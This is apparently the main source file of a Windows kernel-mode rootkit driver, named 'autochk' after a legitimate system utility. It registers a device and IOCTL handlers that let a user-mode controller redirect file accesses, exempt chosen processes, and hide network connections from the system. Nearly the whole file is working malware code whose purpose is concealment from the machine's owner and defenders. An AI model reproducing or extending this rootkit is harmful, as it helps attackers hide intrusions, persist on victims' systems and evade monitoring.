#include <ntifs.h>
#include "Network.h"
#include "FileSystem.h"
#include "Ioctl.h"
#include "Debug.h"


NTSTATUS AutochkDriverUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS AutochkIrpDefaultDispatcher(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS AutochkDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

WCHAR DeviceName[30] = L"\\Device\\";
WCHAR g_SymbolicLinkName[30] = L"\\DosDevices\\";
PDEVICE_OBJECT g_DeviceObject;


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	D_INFO("Initializing Autochk Rootkit..");

	NTSTATUS Status;
	UNICODE_STRING DeviceNameUnicodeString;
	UNICODE_STRING SymbolicNameUnicodeString;
	
	WCHAR Name[] = L"autochk";
	
	wcscat(DeviceName, Name);
	wcscat(g_SymbolicLinkName, Name);

	DriverObject->DriverUnload = AutochkDriverUnload;

	RtlInitUnicodeString(&DeviceNameUnicodeString, DeviceName);
	RtlInitUnicodeString(&SymbolicNameUnicodeString, g_SymbolicLinkName);

	Status = IoCreateDevice(DriverObject, 0, &DeviceNameUnicodeString, FILE_DEVICE_UNKNOWN, 0, FALSE, &g_DeviceObject);
	
	if (!NT_SUCCESS(Status))
	{
		D_ERROR_STATUS("IoCreateDevice Failed: Could not create device object", Status);
		return STATUS_NO_SUCH_DEVICE;
	}

	Status = IoCreateSymbolicLink(&SymbolicNameUnicodeString, &DeviceNameUnicodeString);

	if (!NT_SUCCESS(Status))
	{
		D_ERROR_STATUS("IoCreateSymbolicLink Failed: Could not create symbolic link", Status);
		IoDeleteDevice(g_DeviceObject);
		return STATUS_NO_SUCH_DEVICE;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = AutochkIrpDefaultDispatcher;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = AutochkIrpDefaultDispatcher;
	DriverObject->MajorFunction[IRP_MJ_READ] = AutochkIrpDefaultDispatcher;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = AutochkIrpDefaultDispatcher;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = AutochkDeviceControl;

	// Return status is ignored...
	
	FsInitializeFileRedirection();

	NetInitializeConnectionHider();

	return STATUS_SUCCESS;
}

NTSTATUS AutochkDriverUnload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	D_INFO("Unloading..");

	UNICODE_STRING SymbolicLink;
	LARGE_INTEGER Interval;

	NetFreeConnectionHider();

	FsFreeFileRedirection();

	RtlInitUnicodeString(&SymbolicLink, g_SymbolicLinkName);

	IoDeleteSymbolicLink(&SymbolicLink);

	if (g_DeviceObject)
	{
		IoDeleteDevice(g_DeviceObject);
	}

	D_INFO("Sleeping..");

	//
	// After removing all IRP hooks, the rootkit sleeps to make sure all his handlers are done.
	//
	Interval.QuadPart = -100000000;
	KeDelayExecutionThread(KernelMode, FALSE, &Interval);

	D_INFO("Goodbye");

	return STATUS_SUCCESS;
}

NTSTATUS AutochkIrpDefaultDispatcher(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	
	// Missing Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS AutochkDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	ULONG InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
	Irp->IoStatus.Status = STATUS_SUCCESS;

	switch (IoStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_AUTOCHK_ADD_FILE_REDIRECTION:
		{
			D_INFO_ARGS("Processing IOCTL_AUTOCHK_ADD_FILE_REDIRECTION by %d..", HandleToUlong(PsGetCurrentProcessId()));

			if (InputBufferLength != sizeof(AUTOCHK_REDIRECTED_FILE))
			{
				D_ERROR_ARGS("Invalid Length! %d", InputBufferLength);
				goto exit;
			}

			PAUTOCHK_REDIRECTED_FILE RedirectionEntry = (PAUTOCHK_REDIRECTED_FILE)Irp->AssociatedIrp.SystemBuffer;
			FsAddFileRedirection(RedirectionEntry->SourceFilePath, RedirectionEntry->TargetFilePath);
			break;
		}	
		case IOCTL_AUTOCHK_ADD_FS_IGNORED_PROCESS:
		{
			D_INFO_ARGS("Processing IOCTL_AUTOCHK_ADD_FS_IGNORED_PROCESS by %d..", HandleToUlong(PsGetCurrentProcessId()));

			if (InputBufferLength != IGNORED_PROCESS_NAME_LENGTH)
			{
				D_ERROR_ARGS("Invalid Length! %d", InputBufferLength);
				goto exit;
			}

			FsAddIgnoredProcess((PCSTR)Irp->AssociatedIrp.SystemBuffer);
			break;
		}
		case IOCTL_AUTOCHK_ADD_HIDDEN_CONNECTION:
		{
			D_INFO_ARGS("Processing IOCTL_AUTOCHK_ADD_HIDDEN_CONNECTION by %d..", HandleToUlong(PsGetCurrentProcessId()));

			if (InputBufferLength != sizeof(AUTOCHK_HIDDEN_CONNECTION))
			{
				D_ERROR_ARGS("Invalid Length! %d", InputBufferLength);
				goto exit;
			}

			NetAddHiddenConnection((PAUTOCHK_HIDDEN_CONNECTION)(Irp->AssociatedIrp.SystemBuffer));
			break;

		}
		default:
		{
			Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
		}
	}

exit:
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return Irp->IoStatus.Status;
}